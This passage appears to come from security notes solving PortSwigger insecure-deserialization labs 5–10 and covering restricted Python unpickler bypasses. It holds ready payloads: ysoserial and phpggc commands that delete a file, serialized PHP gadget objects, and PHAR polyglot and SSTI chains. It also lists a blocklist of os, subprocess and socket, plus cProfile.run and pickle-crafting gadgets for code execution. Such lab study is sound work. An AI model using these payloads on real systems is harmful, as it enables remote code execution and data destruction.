O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

### Lab 5 — Exploiting Java deserialization with Apache Commons (Practitioner)

Cookie starts with `rO0` (Java serialized). Generate payload with ysoserial CommonsCollections4, URL-encode key characters, inject as cookie. For Java 16+: use `--add-opens` flags (see ysoserial section above) or use Java 14.

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

### Lab 6 — Exploiting PHP deserialization with a pre-built gadget chain (Practitioner)

1. Find `SECRET_KEY` in `/cgi-bin/phpinfo.php` environment variables.
2. Corrupt cookie signature to trigger error revealing framework: `Symfony 4.3.6`.
3. Generate payload: `phpggc Symfony/RCE7 system 'rm /home/carlos/morale.txt' | base64`
4. Re-sign with PHP HMAC script (see HMAC-signed cookie workflow above).
5. Inject signed cookie.

### Lab 7 — Exploiting Ruby deserialization using a documented gadget chain (Practitioner)

Cookie is Ruby Marshal-serialized (binary prefix `\x04\x08`, `marshal-dump`/`marshal-load` indicators). Use Universal Deserialisation Gadget for Ruby 2.x–3.x (full script in Ruby section above). Set `@git_set` to command, base64-encode output, inject as cookie.

### Lab 8 — Developing a custom gadget chain for Java deserialization (Expert)

HTML comment reveals `/backup/` containing `AccessTokenUser.java` and `ProductTemplate.java`. `ProductTemplate.readObject()` executes a SQL query with `id` field directly interpolated. Chain: serialize `ProductTemplate` with SQLi payload in `id` → cookie → `readObject()` triggers query → error-based extraction via `CAST(x AS numeric)`. Use PortSwigger serialization-examples Java helper to compile and serialize objects.

### Lab 9 — Developing a custom gadget chain for PHP deserialization (Expert)

Source via tilde trick on backup PHP files. Chain: `CustomTemplate->__wakeup()` → `Product` constructor reads `default_desc_type` from `DefaultMap` object → `DefaultMap->__get()` triggers → `call_user_func($callback, $name)`. Set `callback = "exec"` and `default_desc_type` = command.

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

### Lab 10 — Using PHAR deserialization to deploy a custom gadget chain (Expert)

Chain: `CustomTemplate->__destruct()` → `file_exists(lockFilePath())` on `phar://` path → `Blog->__wakeup()` → Twig SSTI via `$this->desc`. Build PHAR-JPG polyglot with `phar-jpg-polyglot`, embed Twig SSTI payload in `Blog->desc`, upload as avatar, trigger via `phar://` path. Full workflow in PHAR Deserialization section above.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[gwt-attacks]]
- [[ml-model-deserialization]]

## Restricted unpickler: blocklist-gap single-call code-exec gadgets

A "restricted" `find_class` that rejects by **module name against a blocklist** (blocks
`os`, `posix`, `builtins`, `subprocess`, `sys`, `importlib`, `socket` ...) still allows the rest of
stdlib. Any un-blocked module exposing a **one-call arbitrary-code sink** is RCE in a single
`REDUCE` - no gadget chain, no allowed-class hunt:

- `cProfile.run("<py>")`, `profile.run("<py>")`, `pdb.run("<py>")` - each `exec()`s a code string.
- `timeit.timeit("<py>")` / `timeit.Timer("<py>").timeit()` - runs the stmt (loops, so make it idempotent).

```python
cProfile.run("__import__('os').system('id')")   # module cProfile is rarely on a blocklist
```

**Map the filter black-box** by crafting a raw `GLOBAL`+`REDUCE` pickle per `(module, name)` and
reading the (usually verbose) error: `blocked module 'X'` = blocklisted; `Can't get attribute 'Y' on
<module ...>` = module allowed, wrong attr; a repr back = allowed + executed. Minimal craft (proto 2,
`c`=GLOBAL, `V`=unicode arg): `b"\x80\x02c"+mod+b"\n"+name+b"\n(V"+arg+b"\ntR."` base64'd.

Gotcha: an allowed app module that did `import os` exposes `app.os` (the module), but the restricted
`find_class` does a **plain `getattr` (no dotted resolution)**, so `app` + name `os.system` fails -
you cannot walk `.system` off it. Use the single-call stdlib gadget above instead. This is a real
allowlist/blocklist bypass distinct from "chain to os via an allowed module's imports".

<!-- promoted-slug: pickle-blocklist-unpickler-gadgets -->
